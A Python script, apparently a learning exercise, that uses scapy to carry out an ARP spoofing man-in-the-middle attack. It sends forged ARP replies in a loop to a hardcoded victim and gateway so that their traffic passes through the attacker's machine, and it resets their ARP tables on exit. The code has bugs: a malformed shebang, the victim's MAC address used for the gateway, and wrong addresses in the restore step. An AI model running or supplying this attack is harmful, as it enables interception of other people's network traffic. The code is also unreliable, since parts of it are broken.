#!usr/env/bin/python
import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    #print(answered_list[0][1].hwsrc)
    return answered_list[0][1].hwsrc

def spoof(target_ip , spoof_ip , target_mac):
    #target_mac = get_mac(target_ip)# This causes an error where the list goes out of range
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)
    # print(packet.show())
    # print(packet.summary()) To print the content of the packet
    # Send the packet to the target machine giving it the kali's MAC Addresss as the address of the router

target_mac = get_mac("192.168.1.38")  
sent_packets_count = 0 

# This function restores the arp table of the victim machine and the router setting it back to its original value

def restore(destination_ip , source_ip , destination_mac , source_mac):
    packet = scapy.ARP(op = 2 , pdst = destination_ip , hwdst =destination_mac, psrc =source_ip , hwsrc=source_mac)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet , count= 4 , verbose = False)


target_ip = "192.168.1.38"
gateway_ip = "192.168.1.1"
target_mac = get_mac(target_ip)  #Also destination_mac  
source_mac = get_mac(gateway_ip)
try:
    sent_packets_count = 0 
    while True:
        spoof(target_ip, gateway_ip , target_mac)
        spoof(gateway_ip, target_ip , target_mac)
        sent_packets_count = sent_packets_count+2
        print("\r[+] Packets sent : " + str(sent_packets_count)),     
        sys.stdout.flush()   
        print("\r [+] Packets sent :" + str(sent_packets_count), end=" ") 
       # sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:
    print("[+] Detected CTRL+C ...... Quitting")       
    print("[+] Detected CTRL+C ...... Resetting ARP tables...... Please wait") 
    restore(target_ip, gateway_ip , target_mac , source_mac)
    restore(gateway_ip , target_ip , target_mac , source_mac)        